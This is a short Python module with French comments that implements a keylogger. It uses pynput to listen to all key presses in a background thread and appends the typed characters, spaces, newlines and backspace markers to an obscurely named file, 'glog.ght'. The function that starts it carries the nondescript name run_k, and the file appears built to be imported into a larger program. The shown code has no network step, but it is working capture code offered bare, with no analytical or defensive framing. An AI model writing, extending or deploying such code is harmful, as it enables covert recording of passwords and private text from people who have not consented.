import logging
from pynput import keyboard
import asyncio

# Configuration du fichier de log unique
logging.basicConfig(filename='glog.ght', level=logging.DEBUG, format="%(message)s")

def on_press(key):
    try:
        # Écrit le caractère normal dans glog.ght
        with open("glog.ght", "a", encoding="utf-8") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Gère les touches spéciales proprement
        with open("glog.ght", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.backspace:
                f.write(" [BACKSPACE] ")

def _start_listener():
    # Exécute le listener de manière bloquante mais isolée dans un thread
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

async def run_k():
    # Lance la fonction bloquante en arrière-plan sans bloquer l'event loop d'asyncio
    await asyncio.to_thread(_start_listener)

